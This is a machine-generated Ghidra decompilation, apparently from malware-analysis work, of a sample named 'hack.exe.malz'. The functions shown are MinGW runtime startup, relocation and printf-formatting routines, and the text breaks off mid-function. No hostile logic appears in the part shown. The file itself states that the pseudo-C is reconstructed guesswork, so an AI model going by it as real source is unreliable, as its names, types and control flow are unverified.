/*
 * AIDebug full-program Ghidra reconstruction
 * Input: hack.exe.malz
 * SHA-256: 905554ce9ca73b16f0ab547d1e4cc4fc88e648687c0ce4fe8e43578f89dcbda2
 * Architecture: x86-64 64-bit
 *
 * This is reconstructed C-like code, not recovered original source.
 * Function boundaries, types, names, parameters, and control flow
 * remain hypotheses that must be checked against machine instructions.
 */

/* ================================================================== */
/* Function sub_140001180 at 0x140001180 */
/* Backend: ghidra; language: c-like */

ulonglong FUN_140001180(undefined *param_1,undefined *param_2,undefined8 param_3,undefined8 param_4)

{
  int iVar1;
  longlong lVar2;
  bool bVar3;
  LPSTR pCVar4;
  uint uVar5;
  longlong lVar6;
  undefined8 *puVar7;
  size_t sVar8;
  void *_Dst;
  ulonglong uVar9;
  undefined8 uVar10;
  undefined8 uVar11;
  longlong lVar12;
  size_t _Size;
  undefined8 *puVar13;
  undefined8 in_R9;
  longlong unaff_GS_OFFSET;
  
  lVar2 = *(longlong *)(*(longlong *)(unaff_GS_OFFSET + 0x30) + 8);
  while( true ) {
    LOCK();
    lVar12 = 0;
    lVar6 = lVar2;
    if (DAT_14000c040 != 0) {
      lVar12 = DAT_14000c040;
      lVar6 = DAT_14000c040;
    }
    DAT_14000c040 = lVar6;
    UNLOCK();
    if (lVar12 == 0) break;
    if (lVar2 == lVar12) {
      bVar3 = true;
joined_r0x0001400011db:
      if (DAT_14000c048 == 1) {
        _amsg_exit(0x1f);
      }
      else if (DAT_14000c048 == 0) {
        DAT_14000c048 = 1;
        _initterm();
      }
      else {
        DAT_14000c008 = 1;
      }
      if (DAT_14000c048 == 1) {
        _initterm();
        DAT_14000c048 = 2;
      }
      if (!bVar3) {
        LOCK();
        DAT_14000c040 = 0;
        UNLOCK();
      }
      uVar11 = 2;
      uVar10 = 0;
      tls_callback_0(0,2);
      FUN_1400018f0(uVar10,uVar11,param_3,param_4);
      DAT_14000c0d0 = SetUnhandledExceptionFilter(FUN_140001ca0);
      FUN_140007470(FUN_140001000);
      FUN_140001700();
      uVar5 = DAT_14000c028;
      iVar1 = DAT_14000c028 + 1;
      _Size = (longlong)iVar1 * 8;
      puVar7 = malloc(_Size);
      lVar2 = (longlong)DAT_14000c020;
      puVar13 = puVar7;
      if (0 < (int)uVar5) {
        lVar12 = 0;
        do {
          sVar8 = strlen(*(char **)(lVar2 + lVar12));
          _Dst = malloc(sVar8 + 1);
          *(void **)((longlong)puVar7 + lVar12) = _Dst;
          puVar13 = (undefined8 *)(lVar2 + lVar12);
          lVar12 = lVar12 + 8;
          memcpy(_Dst,(void *)*puVar13,sVar8 + 1);
        } while (_Size - 8 != lVar12);
        puVar13 = puVar7 + (longlong)iVar1 + -1;
      }
      *puVar13 = 0;
      DAT_14000c020 = puVar7;
      FUN_140001500();
      pCVar4 = DAT_14000c018;
      uVar9 = (ulonglong)DAT_14000c028;
      *(LPSTR *)__initenv_exref = DAT_14000c018;
      uVar9 = FUN_140007c90(uVar9,DAT_14000c020,pCVar4,in_R9);
      DAT_14000c010 = (uint)uVar9;
      if (DAT_14000c00c != 0) {
        if (DAT_14000c008 != 0) {
          return uVar9;
        }
        _cexit();
        return (ulonglong)DAT_14000c010;
      }
                    /* WARNING: Subroutine does not return */
      exit(DAT_14000c010);
    }
    Sleep(1000);
  }
  bVar3 = false;
  goto joined_r0x0001400011db;
}

/* ================================================================== */
/* Function sub_1400013f0 at 0x1400013f0 */
/* Backend: ghidra; language: c-like */

void entry(undefined *param_1,undefined *param_2,undefined8 param_3,undefined8 param_4)

{
  DAT_14000c090 = 0;
  FUN_140001180(param_1,param_2,param_3,param_4);
  return;
}

/* ================================================================== */
/* Function sub_140001500 at 0x140001500 */
/* Backend: ghidra; language: c-like */

void FUN_140001500(void)

{
  if (DAT_14000c030 != 0) {
    return;
  }
  DAT_14000c030 = 1;
  FUN_140001490();
  return;
}

/* ================================================================== */
/* Function sub_140001700 at 0x140001700 */
/* Backend: ghidra; language: c-like */

void FUN_140001700(void)

{
  return;
}

/* ================================================================== */
/* Function sub_140001710 at 0x140001710 */
/* Backend: ghidra; language: c-like */

void FUN_140001710(char *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  FILE *pFVar1;
  undefined8 local_res10;
  undefined8 local_res18;
  undefined8 local_res20;
  
  local_res10 = param_2;
  local_res18 = param_3;
  local_res20 = param_4;
  pFVar1 = FUN_140007480(2);
  fwrite("Mingw-w64 runtime failure:\n",1,0x1b,pFVar1);
  pFVar1 = FUN_140007480(2);
  vfprintf(pFVar1,param_1,(va_list)&local_res10);
                    /* WARNING: Subroutine does not return */
  abort();
}

/* ================================================================== */
/* Function sub_140001780 at 0x140001780 */
/* Backend: ghidra; language: c-like */

/* WARNING: Removing unreachable block (ram,0x000140001981) */
/* WARNING: Removing unreachable block (ram,0x000140001b08) */
/* WARNING: Removing unreachable block (ram,0x000140001b10) */
/* WARNING: Removing unreachable block (ram,0x000140001b1e) */
/* WARNING: Removing unreachable block (ram,0x00014000198d) */
/* WARNING: Removing unreachable block (ram,0x000140001997) */
/* WARNING: Removing unreachable block (ram,0x00014000199a) */
/* WARNING: Removing unreachable block (ram,0x0001400019a2) */
/* WARNING: Removing unreachable block (ram,0x0001400019ae) */
/* WARNING: Removing unreachable block (ram,0x0001400019bb) */
/* WARNING: Removing unreachable block (ram,0x000140001a22) */
/* WARNING: Removing unreachable block (ram,0x000140001a3f) */
/* WARNING: Removing unreachable block (ram,0x000140001b30) */
/* WARNING: Removing unreachable block (ram,0x000140001b39) */
/* WARNING: Removing unreachable block (ram,0x000140001b4a) */
/* WARNING: Removing unreachable block (ram,0x000140001bb0) */
/* WARNING: Removing unreachable block (ram,0x000140001a45) */
/* WARNING: Removing unreachable block (ram,0x000140001a4a) */
/* WARNING: Removing unreachable block (ram,0x000140001c32) */
/* WARNING: Removing unreachable block (ram,0x000140001c3e) */
/* WARNING: Removing unreachable block (ram,0x000140001c64) */
/* WARNING: Removing unreachable block (ram,0x000140001c89) */
/* WARNING: Removing unreachable block (ram,0x000140001a53) */
/* WARNING: Removing unreachable block (ram,0x000140001bd0) */
/* WARNING: Removing unreachable block (ram,0x000140001bde) */
/* WARNING: Removing unreachable block (ram,0x000140001a65) */
/* WARNING: Removing unreachable block (ram,0x000140001a76) */
/* WARNING: Removing unreachable block (ram,0x000140001a83) */
/* WARNING: Removing unreachable block (ram,0x000140001a90) */
/* WARNING: Removing unreachable block (ram,0x000140001aa8) */
/* WARNING: Removing unreachable block (ram,0x0001400019d0) */
/* WARNING: Removing unreachable block (ram,0x000140001be8) */
/* WARNING: Removing unreachable block (ram,0x000140001bf6) */
/* WARNING: Removing unreachable block (ram,0x0001400019e2) */
/* WARNING: Removing unreachable block (ram,0x0001400019f3) */
/* WARNING: Removing unreachable block (ram,0x000140001a00) */
/* WARNING: Removing unreachable block (ram,0x000140001b4f) */
/* WARNING: Removing unreachable block (ram,0x000140001b68) */
/* WARNING: Removing unreachable block (ram,0x000140001bc0) */
/* WARNING: Removing unreachable block (ram,0x000140001bca) */
/* WARNING: Removing unreachable block (ram,0x000140001b74) */
/* WARNING: Removing unreachable block (ram,0x000140001b8b) */
/* WARNING: Removing unreachable block (ram,0x000140001b90) */
/* WARNING: Removing unreachable block (ram,0x000140001b9a) */
/* WARNING: Removing unreachable block (ram,0x000140001a0a) */
/* WARNING: Removing unreachable block (ram,0x000140001a15) */
/* WARNING: Removing unreachable block (ram,0x000140001c00) */
/* WARNING: Removing unreachable block (ram,0x000140001c09) */
/* WARNING: Removing unreachable block (ram,0x000140001c10) */
/* WARNING: Removing unreachable block (ram,0x000140001c2d) */
/* WARNING: Removing unreachable block (ram,0x000140001ab0) */
/* WARNING: Removing unreachable block (ram,0x000140001abe) */
/* WARNING: Removing unreachable block (ram,0x000140001ad0) */
/* WARNING: Removing unreachable block (ram,0x000140001ae2) */
/* WARNING: Removing unreachable block (ram,0x000140001aef) */
/* WARNING: Removing unreachable block (ram,0x000140001b00) */
/* WARNING: Enum "SectionFlags": Some values do not have unique names */

void FUN_140001780(uint *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  BOOL BVar1;
  DWORD DVar2;
  ulonglong *puVar3;
  IMAGE_SECTION_HEADER *pIVar4;
  undefined4 *puVar5;
  IMAGE_DOS_HEADER *pIVar6;
  SIZE_T SVar7;
  ulonglong uVar8;
  longlong lVar9;
  uint *in_R8;
  uint uVar10;
  PDWORD in_R9;
  undefined1 auStack_c0 [24];
  uint *puStack_a8;
  longlong lStack_a0;
  IMAGE_SECTION_HEADER *pIStack_98;
  _MEMORY_BASIC_INFORMATION local_48;
  
  lVar9 = (longlong)(int)DAT_14000c0a4;
  if ((int)DAT_14000c0a4 < 1) goto LAB_1400018b0;
  in_R9 = (PDWORD)0x0;
  puVar3 = (ulonglong *)(DAT_14000c0a8 + 0x18);
  do {
    in_R8 = (uint *)*puVar3;
    if ((in_R8 <= param_1) &&
       (in_R8 = (uint *)((longlong)in_R8 + (ulonglong)*(uint *)(puVar3[1] + 8)), param_1 < in_R8)) {
      return;
    }
    uVar10 = (int)in_R9 + 1;
    in_R9 = (PDWORD)(ulonglong)uVar10;
    puVar3 = puVar3 + 5;
  } while (uVar10 != DAT_14000c0a4);
  do {
    pIVar4 = FUN_1400021d0((longlong)param_1);
    if (pIVar4 == (IMAGE_SECTION_HEADER *)0x0) {
LAB_1400018d2:
      FUN_140001710("Address %p has no image-section",param_1,in_R8,in_R9);
      if (DAT_14000c0a0 == 0) {
        DAT_14000c0a0 = 1;
        puStack_a8 = param_1;
        lStack_a0 = lVar9;
        pIStack_98 = pIVar4;
        FUN_140002250();
        uVar8 = FUN_1400024b0();
        DAT_14000c0a4 = 0;
        DAT_14000c0a8 = auStack_c0 + -uVar8;
      }
      return;
    }
    param_1 = (uint *)(lVar9 * 0x28);
    puVar5 = (undefined4 *)(DAT_14000c0a8 + (longlong)param_1);
    *(IMAGE_SECTION_HEADER **)(puVar5 + 8) = pIVar4;
    *puVar5 = 0;
    pIVar6 = FUN_140002310();
    uVar10 = pIVar4->VirtualAddress;
    *(char **)(DAT_14000c0a8 + 0x18 + (longlong)param_1) = pIVar6->e_magic + uVar10;
    SVar7 = VirtualQuery(pIVar6->e_magic + uVar10,&local_48,0x30);
    if (SVar7 == 0) {
      in_R8 = *(uint **)(DAT_14000c0a8 + 0x18 + (longlong)param_1);
      FUN_140001710("  VirtualQuery failed for %d bytes at address %p",
                    (ulonglong)(pIVar4->Misc).PhysicalAddress,in_R8,in_R9);
      goto LAB_1400018d2;
    }
    if (((local_48.Protect - 0x40 & 0xffffffbf) == 0) || ((local_48.Protect - 4 & 0xfffffffb) == 0))
    {
LAB_14000184e:
      DAT_14000c0a4 = DAT_14000c0a4 + 1;
      return;
    }
    in_R8 = (uint *)0x40;
    if (local_48.Protect == 2) {
      in_R8 = (uint *)0x4;
    }
    param_1 = (uint *)((longlong)param_1 + (longlong)DAT_14000c0a8);
    *(PVOID *)(param_1 + 2) = local_48.BaseAddress;
    *(SIZE_T *)(param_1 + 4) = local_48.RegionSize;
    in_R9 = param_1;
    BVar1 = VirtualProtect(local_48.BaseAddress,local_48.RegionSize,(DWORD)in_R8,param_1);
    if (BVar1 != 0) goto LAB_14000184e;
    DVar2 = GetLastError();
    FUN_140001710("  VirtualProtect failed with code 0x%x",(ulonglong)DVar2,in_R8,in_R9);
LAB_1400018b0:
    lVar9 = 0;
  } while( true );
}

/* ================================================================== */
/* Function sub_1400018f0 at 0x1400018f0 */
/* Backend: ghidra; language: c-like */

/* WARNING: Removing unreachable block (ram,0x000140001981) */
/* WARNING: Removing unreachable block (ram,0x000140001b08) */
/* WARNING: Removing unreachable block (ram,0x000140001b10) */
/* WARNING: Removing unreachable block (ram,0x000140001b1e) */
/* WARNING: Removing unreachable block (ram,0x00014000198d) */
/* WARNING: Removing unreachable block (ram,0x000140001997) */
/* WARNING: Removing unreachable block (ram,0x00014000199a) */
/* WARNING: Removing unreachable block (ram,0x0001400019a2) */
/* WARNING: Removing unreachable block (ram,0x0001400019ae) */
/* WARNING: Removing unreachable block (ram,0x0001400019bb) */
/* WARNING: Removing unreachable block (ram,0x000140001a22) */
/* WARNING: Removing unreachable block (ram,0x000140001a3f) */
/* WARNING: Removing unreachable block (ram,0x000140001b30) */
/* WARNING: Removing unreachable block (ram,0x000140001b39) */
/* WARNING: Removing unreachable block (ram,0x000140001b4a) */
/* WARNING: Removing unreachable block (ram,0x000140001bb0) */
/* WARNING: Removing unreachable block (ram,0x000140001a45) */
/* WARNING: Removing unreachable block (ram,0x000140001a4a) */
/* WARNING: Removing unreachable block (ram,0x000140001c32) */
/* WARNING: Removing unreachable block (ram,0x000140001c3e) */
/* WARNING: Removing unreachable block (ram,0x000140001c64) */
/* WARNING: Removing unreachable block (ram,0x000140001c89) */
/* WARNING: Removing unreachable block (ram,0x000140001a53) */
/* WARNING: Removing unreachable block (ram,0x000140001bd0) */
/* WARNING: Removing unreachable block (ram,0x000140001bde) */
/* WARNING: Removing unreachable block (ram,0x000140001a65) */
/* WARNING: Removing unreachable block (ram,0x000140001a76) */
/* WARNING: Removing unreachable block (ram,0x000140001a83) */
/* WARNING: Removing unreachable block (ram,0x000140001a90) */
/* WARNING: Removing unreachable block (ram,0x000140001aa8) */
/* WARNING: Removing unreachable block (ram,0x0001400019d0) */
/* WARNING: Removing unreachable block (ram,0x000140001be8) */
/* WARNING: Removing unreachable block (ram,0x000140001bf6) */
/* WARNING: Removing unreachable block (ram,0x0001400019e2) */
/* WARNING: Removing unreachable block (ram,0x0001400019f3) */
/* WARNING: Removing unreachable block (ram,0x000140001a00) */
/* WARNING: Removing unreachable block (ram,0x000140001b4f) */
/* WARNING: Removing unreachable block (ram,0x000140001b68) */
/* WARNING: Removing unreachable block (ram,0x000140001bc0) */
/* WARNING: Removing unreachable block (ram,0x000140001bca) */
/* WARNING: Removing unreachable block (ram,0x000140001b74) */
/* WARNING: Removing unreachable block (ram,0x000140001b8b) */
/* WARNING: Removing unreachable block (ram,0x000140001b90) */
/* WARNING: Removing unreachable block (ram,0x000140001b9a) */
/* WARNING: Removing unreachable block (ram,0x000140001a0a) */
/* WARNING: Removing unreachable block (ram,0x000140001a15) */
/* WARNING: Removing unreachable block (ram,0x000140001c00) */
/* WARNING: Removing unreachable block (ram,0x000140001c09) */
/* WARNING: Removing unreachable block (ram,0x000140001c10) */
/* WARNING: Removing unreachable block (ram,0x000140001c2d) */
/* WARNING: Removing unreachable block (ram,0x000140001ab0) */
/* WARNING: Removing unreachable block (ram,0x000140001abe) */
/* WARNING: Removing unreachable block (ram,0x000140001ad0) */
/* WARNING: Removing unreachable block (ram,0x000140001ae2) */
/* WARNING: Removing unreachable block (ram,0x000140001aef) */
/* WARNING: Removing unreachable block (ram,0x000140001b00) */

void FUN_1400018f0(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  ulonglong uVar1;
  undefined1 auStack_58 [24];
  
  if (DAT_14000c0a0 == 0) {
    DAT_14000c0a0 = 1;
    FUN_140002250();
    uVar1 = FUN_1400024b0();
    DAT_14000c0a4 = 0;
    DAT_14000c0a8 = auStack_58 + -uVar1;
  }
  return;
}

/* ================================================================== */
/* Function sub_1400021d0 at 0x1400021d0 */
/* Backend: ghidra; language: c-like */

/* WARNING: Enum "SectionFlags": Some values do not have unique names */

IMAGE_SECTION_HEADER * FUN_1400021d0(longlong param_1)

{
  IMAGE_SECTION_HEADER *pIVar1;
  
  pIVar1 = &IMAGE_SECTION_HEADER_140000188;
  while ((param_1 - 0x140000000U < (ulonglong)(uint)pIVar1->VirtualAddress ||
         ((ulonglong)(pIVar1->VirtualAddress + (pIVar1->Misc).PhysicalAddress) <=
          param_1 - 0x140000000U))) {
    pIVar1 = pIVar1 + 1;
    if (pIVar1 == (IMAGE_SECTION_HEADER *)&DAT_140000318) {
      return (IMAGE_SECTION_HEADER *)0x0;
    }
  }
  return pIVar1;
}

/* ================================================================== */
/* Function sub_140002250 at 0x140002250 */
/* Backend: ghidra; language: c-like */

/* WARNING: Removing unreachable block (ram,0x00014000226f) */

word FUN_140002250(void)

{
  return 10;
}

/* ================================================================== */
/* Function sub_140002310 at 0x140002310 */
/* Backend: ghidra; language: c-like */

/* WARNING: Removing unreachable block (ram,0x00014000232f) */

IMAGE_DOS_HEADER * FUN_140002310(void)

{
  return &IMAGE_DOS_HEADER_140000000;
}

/* ================================================================== */
/* Function sub_1400024b0 at 0x1400024b0 */
/* Backend: ghidra; language: c-like */

ulonglong FUN_1400024b0(void)

{
  ulonglong in_RAX;
  ulonglong uVar1;
  undefined8 *puVar2;
  undefined8 local_res8 [4];
  
  puVar2 = local_res8;
  uVar1 = in_RAX;
  if (0xfff < in_RAX) {
    do {
      puVar2 = puVar2 + -0x200;
      *puVar2 = *puVar2;
      uVar1 = uVar1 - 0x1000;
    } while (0x1000 < uVar1);
  }
  *(undefined8 *)((longlong)puVar2 - uVar1) = *(undefined8 *)((longlong)puVar2 - uVar1);
  return in_RAX;
}

/* ================================================================== */
/* Function sub_1400024f0 at 0x1400024f0 */
/* Backend: ghidra; language: c-like */

int FUN_1400024f0(FILE *param_1,byte *param_2,ulonglong *param_3)

{
  int iVar1;
  
  FUN_140007390(param_1);
  iVar1 = FUN_140004040(0x6000,param_1,0,param_2,param_3);
  FUN_140007400(param_1);
  return iVar1;
}

/* ================================================================== */
/* Function sub_140002630 at 0x140002630 */
/* Backend: ghidra; language: c-like */

void FUN_140002630(int param_1,undefined8 *param_2)

{
  int iVar1;
  
  if (((*(uint *)(param_2 + 1) & 0x4000) != 0) ||
     (iVar1 = *(int *)((longlong)param_2 + 0x24), iVar1 < *(int *)(param_2 + 5))) {
    if ((*(uint *)(param_2 + 1) & 0x2000) != 0) {
      fputc(param_1,(FILE *)*param_2);
      *(int *)((longlong)param_2 + 0x24) = *(int *)((longlong)param_2 + 0x24) + 1;
      return;
    }
    *(char *)((longlong)&((FILE *)*param_2)->_ptr + (longlong)*(int *)((longlong)param_2 + 0x24)) =
         (char)param_1;
    iVar1 = *(int *)((longlong)param_2 + 0x24);
  }
  *(int *)((longlong)param_2 + 0x24) = iVar1 + 1;
  return;
}

/* ================================================================== */
/* Function sub_140004040 at 0x140004040 */
/* Backend: ghidra; language: c-like */

/* WARNING: Type propagation algorithm not settling */

int FUN_140004040(uint param_1,FILE *param_2,int param_3,byte *param_4,ulonglong *param_5)

{
  int iVar1;
  longlong *plVar2;
  byte bVar3;
  uint uVar4;
  int extraout_EAX;
  int *piVar5;
  char *pcVar6;
  lconv *plVar7;
  longlong lVar8;
  size_t sVar9;
  uint uVar10;
  int iVar11;
  ulonglong *puVar12;
  ulonglong uVar13;
  ushort uVar14;
  undefined1 (*pauVar15) [10];
  ushort uVar16;
  byte *pbVar17;
  byte *pbVar18;
  wchar_t *_Str;
  uint uVar19;
  int iVar20;
  uint *puVar21;
  ulonglong local_c8;
  ushort uStack_c0;
  undefined1 local_a8 [3] [10];
  WCHAR local_8a;
  ulonglong local_88 [2];
  FILE *local_78;
  uint local_70;
  uint local_6c;
  uint auStack_68 [2];
  undefined2 local_60;
  int local_5c;
  WCHAR local_58;
  int local_54;
  int local_50;
  undefined4 local_4c;
  
  piVar5 = _errno();
  uVar10 = (uint)(char)*param_4;
  uVar19 = param_1 & 0x6000;
  iVar1 = *piVar5;
  local_50 = param_3;
  auStack_68[0] = 0xffffffff;
  auStack_68[1] = 0xfffffffd;
  local_60 = 0;
  local_6c = 0xffffffff;
  local_5c = 0;
  local_58 = L'\0';
  local_54 = 0;
  local_4c = 0xffffffff;
  if (*param_4 == 0) {
    return 0;
  }
  uVar4 = uVar10;
  local_78 = param_2;
  local_70 = uVar19;
LAB_14000413e:
  iVar20 = local_54;
  pbVar17 = param_4 + 1;
  if (uVar10 == 0x25) {
    bVar3 = *pbVar17;
    local_6c = 0xffffffff;
    auStack_68[0] = 0xffffffff;
    if (bVar3 == 0) {
      return local_54;
    }
    iVar20 = 0;
    uVar10 = 0;
    pbVar18 = pbVar17;
    puVar21 = &local_6c;
    local_70 = uVar19;
    do {
      param_4 = pbVar18 + 1;
      iVar11 = (int)(char)bVar3;
      switch(bVar3) {
      case 0x20:
        if (uVar10 != 0) goto LAB_1400041e0;
        bVar3 = pbVar18[1];
        local_70 = local_70 | 0x40;
        break;
      default:
        if ((9 < (byte)(bVar3 - 0x30)) || (3 < uVar10)) {
LAB_1400043b7:
          FUN_140002630(0x25,&local_78);
          param_4 = pbVar17;
          goto LAB_14000412c;
        }
        if (uVar10 == 0) {
          uVar10 = 1;
        }
        else {
LAB_1400048f9:
          if (uVar10 == 2) {
            uVar10 = 3;
          }
        }
        if (puVar21 != (uint *)0x0) {
          if ((int)*puVar21 < 0) {
            bVar3 = pbVar18[1];
            *puVar21 = iVar11 - 0x30;
            break;
          }
          *puVar21 = iVar11 + -0x30 + *puVar21 * 10;
        }
LAB_1400041e0:
        bVar3 = pbVar18[1];
        break;
      case 0x23:
        if (uVar10 != 0) goto LAB_1400041e0;
        bVar3 = pbVar18[1];
        local_70 = local_70 | 0x800;
        break;
      case 0x25:
        goto switchD_140004180_caseD_25;
      case 0x27:
        if (uVar10 != 0) goto LAB_1400041e0;
        local_70 = local_70 | 0x1000;
        local_88[0] = local_88[0] & 0xffffffff00000000;
        plVar7 = localeconv();
        lVar8 = FUN_1400077d0(&local_8a,(byte *)plVar7->thousands_sep,0x10,(byte *)local_88);
        if (0 < (int)lVar8) {
          local_58 = local_8a;
        }
        local_5c = (int)lVar8;
        bVar3 = pbVar18[1];
        break;
      case 0x2a:
        if (puVar21 == (uint *)0x0) {
LAB_1400045b9:
          bVar3 = pbVar18[1];
          uVar10 = 4;
        }
        else if ((uVar10 & 0xfffffffd) == 0) {
          uVar13 = *param_5;
          param_5 = param_5 + 1;
          *puVar21 = (uint)uVar13;
          if ((int)(uint)uVar13 < 0) {
            if (uVar10 != 0) {
              bVar3 = pbVar18[1];
              puVar21 = (uint *)0x0;
              auStack_68[0] = 0xffffffff;
              uVar10 = 2;
              break;
            }
            local_70 = local_70 | 0x400;
            local_6c = -local_6c;
          }
          bVar3 = pbVar18[1];
          puVar21 = (uint *)0x0;
        }
        else {
          bVar3 = pbVar18[1];
          puVar21 = (uint *)0x0;
          uVar10 = 4;
        }
        break;
      case 0x2b:
        if (uVar10 != 0) goto LAB_1400041e0;
        bVar3 = pbVar18[1];
        local_70 = local_70 | 0x100;
        break;
      case 0x2d:
        if (uVar10 != 0) goto LAB_1400041e0;
        bVar3 = pbVar18[1];
        local_70 = local_70 | 0x400;
        break;
      case 0x2e:
        if (1 < uVar10) goto LAB_1400045b9;
        bVar3 = pbVar18[1];
        uVar10 = 2;
        auStack_68[0] = 0;
        puVar21 = auStack_68;
        break;
      case 0x30:
        if (uVar10 != 0) {
          if (uVar10 != 4) {
            iVar11 = 0x30;
            goto LAB_1400048f9;
          }
          goto LAB_1400043b7;
        }
        bVar3 = pbVar18[1];
        local_70 = local_70 | 0x200;
        break;
      case 0x41:
        puVar12 = (ulonglong *)*param_5;
        if ((local_70 & 4) != 0) goto LAB_1400043fe;
LAB_1400045f8:
        uVar10 = (uint)puVar12;
        uVar4 = (uint)((ulonglong)puVar12 >> 0x20);
        if (-1 < (int)(0x7ff00000 - ((-uVar10 | uVar10) >> 0x1f | uVar4 & 0x7fffffff))) {
          local_c8 = SUB108((float10)(double)puVar12,0);
          uStack_c0 = (ushort)((unkuint10)(float10)(double)puVar12 >> 0x40);
          if ((short)uStack_c0 < 0) {
            local_70 = local_70 | 0x80;
          }
          if (((((ulonglong)puVar12 & 0xfffff00000000) == 0 && uVar10 == 0) &&
               (uVar4 & 0x7ff00000) == 0x7ff00000) &&
             ((((ulonglong)puVar12 & 0xfffff00000000) != 0 || uVar10 != 0) ||
              ((ulonglong)puVar12 & 0x7ff0000000000000) != 0)) {
            FUN_1400029c0(uStack_c0 & 0x8000,0x1400093aa,&local_78);
            goto LAB_140004510;
          }
          uVar14 = uStack_c0 & 0x7fff;
          if ((uStack_c0 & 0x7fff) == 0) {
LAB_140004989:
            if (local_c8 != 0) {
              uVar14 = 0xfc05;
            }
          }
          else {
            if (uVar14 < 0x3c01) {
              local_c8 = local_c8 >> ((byte)(0x3c01 - uVar14) & 0x3f);
              uVar14 = uVar14 + (0x3c01 - uVar14);
            }
            else if ((uStack_c0 & 0x7fff) == 0) goto LAB_140004989;
            uVar14 = uVar14 + 0xc004;
          }
          local_c8 = local_c8 >> 3;
          goto LAB_140004897;
        }
LAB_14000490b:
        FUN_1400029c0(0,0x1400093a6,&local_78);
        goto LAB_140004510;
      case 0x43:
        goto LAB_14000469f;
      case 0x45:
        pauVar15 = (undefined1 (*) [10])*param_5;
        if ((local_70 & 4) != 0) goto LAB_140004561;
LAB_1400046d7:
        local_a8[0] = (undefined1  [10])(float10)(double)pauVar15;
        FUN_1400038a0(local_a8,&local_78);
        goto LAB_140004510;
      case 0x46:
        pauVar15 = (undefined1 (*) [10])*param_5;
        if ((local_70 & 4) != 0) goto LAB_140004533;
LAB_140004708:
        local_a8[0] = (undefined1  [10])(float10)(double)pauVar15;
        FUN_140003940(local_a8,&local_78);
        goto LAB_140004510;
      case 0x47:
        pauVar15 = (undefined1 (*) [10])*param_5;
        if ((local_70 & 4) != 0) goto LAB_1400044fb;
LAB_140004739:
        local_a8[0] = (undefined1  [10])(float10)(double)pauVar15;
        FUN_140003a20(local_a8,&local_78);
        goto LAB_140004510;
      case 0x49:
        bVar3 = pbVar18[1];
        if (bVar3 == 0x36) {
          if (pbVar18[2] != 0x34) goto LAB_1400043b7;
          bVar3 = pbVar18[3];
          iVar20 = 3;
          param_4 = pbVar18 + 3;
          uVar10 = 4;
        }
        else if (bVar3 == 0x33) {
          if (pbVar18[2] != 0x32) goto LAB_1400043b7;
          bVar3 = pbVar18[3];
          iVar20 = 2;
          param_4 = pbVar18 + 3;
          uVar10 = 4;
        }
        else {
          iVar20 = 3;
          uVar10 = 4;
        }
        break;
      case 0x4c:
        bVar3 = pbVar18[1];
        local_70 = local_70 | 4;
        uVar10 = 4;
        break;
      case 0x53:
LAB_1400048aa:
        _Str = (wchar_t *)*param_5;
        if (_Str == (wchar_t *)0x0) {
          _Str = L"(null)";
        }
        if ((int)auStack_68[0] < 0) {
          sVar9 = wcslen(_Str);
          FUN_140002690((longlong)_Str,(int)sVar9,&local_78);
        }
        else {
          FUN_140007340((longlong)_Str,(longlong)(int)auStack_68[0]);
          FUN_140002690((longlong)_Str,extraout_EAX,&local_78);
        }
        goto LAB_1400044d9;
      case 0x58:
      case 0x6f:
      case 0x75:
      case 0x78:
        local_70 = local_70 & 0xfffffeff;
        if (iVar20 == 3) {
          local_88[0] = *param_5;
        }
        else if (iVar20 == 2) {
          local_88[0] = (ulonglong)(uint)*param_5;
        }
        else {
          uVar10 = (uint)*param_5;
          if (iVar20 == 1) {
            local_88[0] = (ulonglong)(uVar10 & 0xffff);
          }
          else {
            local_88[0] = (ulonglong)(uVar10 & 0xff);
            if (iVar20 != 5) {
              local_88[0] = (ulonglong)uVar10;
            }
          }
        }
        if (iVar11 == 0x75) {
          FUN_140002f10(local_88[0],&local_78);
        }
        else {
          FUN_140002a60(iVar11,local_88[0],&local_78);
        }
        goto LAB_140004510;
      case 0x61:
        puVar12 = (ulonglong *)*param_5;
        uVar4 = local_70 | 0x20;
        uVar10 = local_70 & 4;
        local_70 = uVar4;
        if (uVar10 == 0) goto LAB_1400045f8;
LAB_1400043fe:
        local_c8 = *puVar12;
        uVar16 = (ushort)(uint)puVar12[1];
        uVar10 = (uint)(local_c8 >> 0x20) & 0x7fffffff | (uint)local_c8;
        if (0xfffe - ((-uVar10 | uVar10) >> 0x1f | (short)uVar16 * 2 & 0xffffU) >> 0x10 != 0)
        goto LAB_14000490b;
        if ((short)uVar16 < 0) {
          local_70 = local_70 | 0x80;
        }
        uVar14 = uVar16 & 0x7fff;
        if (((uint)puVar12[1] & 0x7fff) == 0) {
          if (local_c8 != 0) {
            uVar14 = 0xc002;
          }
        }
        else {
          if ((uVar14 == 0x7fff) && (uVar10 == 0)) {
            FUN_1400029c0((int)(short)uVar16 & 0x8000,0x1400093aa,&local_78);
            goto LAB_140004510;
          }
          uVar14 = uVar14 + 0xc001;
        }
LAB_140004897:
        FUN_140003ba0(local_c8,uVar14,&local_78);
        goto LAB_140004510;
      case 99:
        auStack_68[0] = 0xffffffff;
        if (iVar20 - 2U < 2) {
LAB_14000469f:
          auStack_68[0] = 0xffffffff;
          local_88[0] = CONCAT62(local_88[0]._2_6_,(short)(uint)*param_5);
          FUN_140002690((longlong)local_88,1,&local_78);
          param_5 = param_5 + 1;
        }
        else {
          local_88[0] = CONCAT71(local_88[0]._1_7_,(char)(uint)*param_5);
          FUN_140002820((char *)local_88,1,&local_78);
          param_5 = param_5 + 1;
        }
        goto LAB_14000412c;
      case 100:
      case 0x69:
        local_70 = local_70 | 0x80;
        if (iVar20 == 3) {
          uVar13 = *param_5;
        }
        else {
          uVar10 = (uint)*param_5;
          uVar13 = (longlong)(int)uVar10;
          if (iVar20 != 2) {
            if (iVar20 == 1) {
              uVar13 = (ulonglong)(short)uVar10;
            }
            else if (iVar20 == 5) {
              uVar13 = (longlong)(char)uVar10;
            }
          }
        }
        FUN_140002f10(uVar13,&local_78);
        param_5 = param_5 + 1;
        goto LAB_14000412c;
      case 0x65:
        pauVar15 = (undefined1 (*) [10])*param_5;
        uVar4 = local_70 | 0x20;
        uVar10 = local_70 & 4;
        local_70 = uVar4;
        if (uVar10 == 0) goto LAB_1400046d7;
LAB_140004561:
        local_a8[0] = *pauVar15;
        FUN_1400038a0(local_a8,&local_78);
        goto LAB_140004510;
      case 0x66:
